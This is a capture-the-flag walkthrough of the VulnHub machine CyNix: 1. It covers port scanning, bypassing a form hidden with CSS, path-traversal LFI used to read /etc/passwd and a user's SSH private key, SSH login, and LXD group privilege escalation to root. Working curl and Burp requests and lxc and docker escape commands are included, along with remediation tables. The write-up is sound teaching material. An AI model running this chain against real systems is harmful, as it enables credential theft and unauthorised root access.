# CyNix: 1 — Writeup

> The form is right there on the page. You just cannot see it because the developer set `opacity: 0`. ( ͡° ͜ʖ ͡°)
>
> CyNix: 1 teaches a lesson that every web developer should know by heart: client-side controls are not security controls. Once you see through the invisible form, everything else falls like dominoes. LFI steals an SSH key, and then a single group membership gives you the entire host. ¯\_(ツ)_/¯

---

| Field | Value |
|-------|-------|
| **Level** | Medium |
| **Target VM** | CyNix: 1 (Linux) |
| **Attacker VM** | Kali Linux 2023+ |
| **VulnHub URL** | https://www.vulnhub.com/entry/cynix-1 |
| **Techniques** | Directory brute-force, CSS client-side bypass, Local File Inclusion (LFI) via path traversal, SSH private key exfiltration, LXD group privilege escalation |
| **CVEs** | No specific CVE. LXD group membership privilege escalation is a design-level misconfiguration (documented in HackerOne reports and Linux security advisories). LFI is a class vulnerability without a specific CVE assigned to this version. |
| **APT Groups** | APT33 (uses LFI for credential and key theft from Linux servers), FIN8 (web application LFI in financial/hospitality environments), generic container-escape-capable actors |

---

## Attack Summary

```
[nmap] ports 80 (HTTP), 6688 (SSH)
    |
    v
[DirBuster] finds /lavalamp
    |
    v
[/lavalamp/canyoubypassme.php] hidden form (opacity: 0) -> POST file= parameter
    |
    v
[Browser DevTools] change opacity to 1 -> form visible
    |
    v
[Burp Suite Repeater] file=../../../etc/passwd -> LFI confirmed
    |
    v
[LFI] file=../../../home/ford/.ssh/id_rsa -> SSH private key extracted
    |
    v
[ssh -i key -p 6688 ford@TARGET] initial access
    |
    v
[id] ford is in lxd group
    |
    v
[lxd-alpine-builder] build Alpine image -> import -> privileged container
    |
    v
[lxc config device add] mount host / at /mnt/root
    |
    v
[lxc exec ignite /bin/sh] root inside container -> /mnt/root/root/flag.txt
```

---

## Methodology

1. Host discovery and port scan (netdiscover + nmap)
2. Web directory brute-force (DirBuster)
3. Client-side CSS bypass via browser developer tools
4. LFI exploitation through path traversal in the POST `file` parameter
5. SSH private key extraction via LFI
6. Initial access via SSH with extracted key (non-standard port 6688)
7. LXD group privilege escalation via privileged container mount

---

## Step 1: Host Discovery and Port Scan

```bash
netdiscover -r 192.168.1.0/24
export TARGET=192.168.1.105
nmap -p- -A $TARGET
```

Expected results:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd
6688/tcp open  ssh     OpenSSH
```

Two services: HTTP on the standard port, SSH on a non-standard port 6688. The non-standard SSH port is a detail to note carefully: attempting port 22 later will fail.

> **MITRE TTP:** T1595.002 — Active Scanning: Vulnerability Scanning

> **Real-world note:** Hiding SSH on a non-standard port is security-through-obscurity. It reduces noise in automated scans but offers no actual protection once an attacker runs a full port scan. APT33 routinely scans full port ranges on targets.

> **Alternative:** `nmap -sV --top-ports 10000 $TARGET` covers the vast majority of non-standard ports used in real deployments.

---

## Step 2: Web Enumeration

The web root returns the default Apache page. Run DirBuster to discover hidden paths:

```bash
dirb http://$TARGET /usr/share/dirb/wordlists/common.txt
```

DirBuster finds `/lavalamp`. Navigating to `http://$TARGET/lavalamp/` reveals a contact form that POSTs to `canyoubypassme.php`.

Visit `http://$TARGET/lavalamp/canyoubypassme.php` directly. The page shows only an image. Inspect the source (Ctrl+U):

```html
<form action="" method="POST" style="opacity:0">
  <input type="text" name="file" value="1">
  <input type="submit" value="Submit">
</form>
```

There it is. The entire form is hidden with `style="opacity:0"`. The parameter name is `file`, and it currently sends the value `1`. ( ͡° ͜ʖ ͡°)

> **MITRE TTP:** T1083 — File and Directory Discovery; T1190 — Exploit Public-Facing Application

---

## Step 3: Expose the Hidden Form and Confirm LFI

Open browser developer tools (F12), find the form element with `opacity:0`, and change the value to `1`. Submit the form with the value `1` to capture the request in Burp Suite Proxy.

Forward the request to Burp Repeater and test for path traversal LFI:

```
POST /lavalamp/canyoubypassme.php HTTP/1.1
Host: 192.168.1.105
Content-Type: application/x-www-form-urlencoded

file=../../../etc/passwd
```

The response returns the contents of `/etc/passwd`. LFI confirmed. Bingo!! ( ˘ ³˘)♥

From the `/etc/passwd` output, identify the interesting users. Look for `ford` with a home directory and `lxd` group membership hinted in the username list.

> **MITRE TTP:** T1055 — not applicable here; T1005 — Data from Local System (via LFI)

> **Real-world note:** LFI vulnerabilities that can traverse to arbitrary paths are rated Critical when they provide access to authentication material such as SSH keys. APT33 and FIN8 have been documented using LFI to read `/etc/passwd`, `/etc/shadow`, and private key files.

> **Alternative:** If Burp is unavailable, `curl` works equally well: `curl -s -X POST http://$TARGET/lavalamp/canyoubypassme.php -d "file=../../../etc/passwd"`

---

## Step 4: SSH Private Key Extraction via LFI

With `ford`'s home directory established from `/etc/passwd`, read the SSH private key:

```
POST /lavalamp/canyoubypassme.php

file=../../../home/ford/.ssh/id_rsa
```

Copy the returned key content. It will look like:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----
```

Paste it into a local file:

```bash
nano key   # paste the key content
chmod 600 key
```

The permissions on the key file must be 600 or SSH will refuse to use it.

> **MITRE TTP:** T1552.004 — Credentials in Files: Private Keys

> **Real-world note:** SSH private key files stored in locations readable by the web server process are a critical misconfiguration. The web server (Apache/nginx) runs as `www-data` or similar. If that process can read `/home/ford/.ssh/id_rsa`, it means the file permissions are too permissive. This exact pattern appeared in real incidents where web application LFI led directly to SSH takeover.

---

## Step 5: Initial Access via SSH

Use the extracted key to log in as `ford` on the non-standard SSH port:

```bash
ssh -i key -p 6688 ford@$TARGET
```

Expected output:

```
ford@cynix:~$
```

Read the user flag:

```bash
cat ~/user.txt
```

Check group membership:

```bash
id
# uid=1001(ford) gid=1001(ford) groups=1001(ford),116(lxd)
```

The `lxd` group is present. This is the escalation path. ( ͡° ͜ʖ ͡°)

> **MITRE TTP:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Step 6: LXD Group Privilege Escalation

Membership in the `lxd` group grants the ability to create and manage LXD containers with full privileges, including mounting the host filesystem. This is effectively root-equivalent access.

### On the attacker machine: Build the Alpine image

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
# produces: alpine-v3.10-x86_64-20191008_1227.tar.gz
python3 -m http.server 8000
```

### On the target machine (as ford): Import and configure the container

```bash
cd /tmp
wget http://192.168.1.107:8000/alpine-v3.10-x86_64-20191008_1227.tar.gz
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

### Inside the container

```bash
id
# uid=0(root) gid=0(root)
cat /mnt/root/root/flag.txt
```

The host filesystem is mounted at `/mnt/root`. You have unrestricted read access to the entire host as root inside the container. ᕕ( ᐛ )ᕗ

> **MITRE TTP:** T1611 — Escape to Host; T1548 — Abuse Elevation Control Mechanism

> **Real-world note:** Adding a user to the `lxd` group is equivalent to giving them unrestricted `sudo`. Container runtimes with privileged access to the host filesystem have been exploited in real-world incidents. Cloud providers and container security benchmarks (CIS, NIST) explicitly flag `lxd` and `docker` group membership as a critical misconfiguration.

> **Alternative:** If LXD is not initialized yet, run `lxd init` first (accept all defaults). The attack also works with Docker group membership using the equivalent `docker run -v /:/mnt/root -it alpine chroot /mnt/root`.

---

## Captured Flags / Hashes / Creds

| Item | Value |
|------|-------|
| User flag | `~/user.txt` (captured as ford) |
| Root flag | `/mnt/root/root/flag.txt` (via privileged LXD container) |
| SSH private key | Extracted via LFI from `/home/ford/.ssh/id_rsa` |
| SSH user | `ford`, port 6688 |
| LXD group | `ford` (116/lxd) |

---

## Lessons Learned

1. **Client-side visibility controls (CSS opacity, `display:none`, `hidden` attributes) are not security controls.** Any attacker can modify DOM properties with browser developer tools or bypass them entirely with `curl`. Security belongs on the server side.

2. **LFI vulnerabilities that can read arbitrary files are Critical severity when authentication material is accessible.** A single LFI from a public web endpoint to a private SSH key is a direct path from zero credentials to shell access.

3. **Membership in the `lxd` or `docker` group is equivalent to root access on the host.** Group assignments must be audited with the same rigor as sudoers entries.

4. **SSH private keys stored in home directories are accessible to any process that can read that path.** Web server processes should never have access to user home directories containing key material.

5. **Non-standard ports provide no security.** A full `nmap -p-` scan finds them in seconds.

**Real-World Relevance:** The LFI-to-SSH-key chain is used in real intrusions. The LXD privilege escalation has been documented in real incidents involving managed hosting providers where customers were added to the `lxd` group during server setup and never removed.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Tool |
|--------|-----------|-----|------|
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 | nmap |
| Discovery | File and Directory Discovery | T1083 | dirb |
| Initial Access | Exploit Public-Facing Application | T1190 | Burp Suite / curl |
| Credential Access | Credentials in Files: Private Keys | T1552.004 | LFI |
| Credential Access | Data from Local System | T1005 | LFI path traversal |
| Initial Access | Valid Accounts | T1078 | SSH with private key |
| Lateral Movement | Remote Services: SSH | T1021.004 | ssh -i key -p 6688 |
| Privilege Escalation | Escape to Host | T1611 | lxc exec |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 | lxd group |
| Command and Control | Ingress Tool Transfer | T1105 | python3 http.server |

---

## Remediation

### NIST CSF 2.0

| Function | Control | Action |
|----------|---------|--------|
| Identify (ID.AM) | Asset inventory | Audit all group memberships; flag lxd/docker group members |
| Protect (PR.AC) | Identity management | Remove ford from lxd group; apply least-privilege group policy |
| Protect (PR.DS) | Data security | Restrict SSH key file permissions to owning user (mode 600, owned by user) |
| Protect (PR.IP) | Information protection | Move LFI-vulnerable `file` parameter to whitelist-only input validation |
| Detect (DE.CM) | Monitoring | Alert on `lxc exec` and `lxc config device add` events via auditd |

### NIST SP 800-53 Rev. 5

| Control | Description |
|---------|-------------|
| AC-6 | Least Privilege: remove users from lxd and docker groups unless strictly required |
| AC-3 | Access Enforcement: enforce server-side authentication for all form submissions |
| SI-10 | Information Input Validation: whitelist allowed file paths in the `file` parameter |
| SC-28 | Protection of Information at Rest: ensure private key files are not readable by web server processes |
| AU-12 | Audit Record Generation: enable auditd rules for container operations and file access in home directories |

### CISA KEV

No CVE from this box appears in the CISA KEV catalog. The LXD group escalation is a misconfiguration, not a patched vulnerability. Organizations should treat group membership audits as a compensating control.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Practice | Gap |
|--------|----------|-----|
| Identity and Access Management (IAM) | MIL-2 | lxd group membership not treated as privileged access |
| Asset, Change, and Configuration Management (ASSET) | MIL-1 | No configuration review process for web application input handling |
| Threat and Vulnerability Management (THREAT) | MIL-1 | LFI in web application not detected or remediated |

### MITRE D3FEND

| D3FEND Technique | ID | Addresses |
|------------------|----|-----------|
| Application Configuration Hardening | D3-ACH | Disable directory traversal; validate file input server-side |
| Credential Hardening | D3-CH | Restrict SSH key permissions; move keys outside web-accessible paths |
| User Account Permissions | D3-UAP | Remove lxd group from non-admin users |
| File System Access Pattern Analysis | D3-FSAPA | Monitor access to /home directories from web server processes |
| Container Workload Security | D3-CWS | Enforce unprivileged containers; audit privileged container creation |

---

## Final Thoughts

CyNix: 1 is a beautiful example of how a single design mistake (a form with `opacity:0`) combined with another design mistake (passing user input directly to a file path) and a single misconfiguration (lxd group membership) chains into a full system compromise.

Each step here is realistic. LFI to SSH key is a documented attack pattern. LXD group to root is a documented misconfiguration with multiple real-world reports.

Thanks to the CyNix author for a clean, focused box that teaches fundamentals without unnecessary noise.

Thanks guys!! (❍ᴥ❍ʋ)
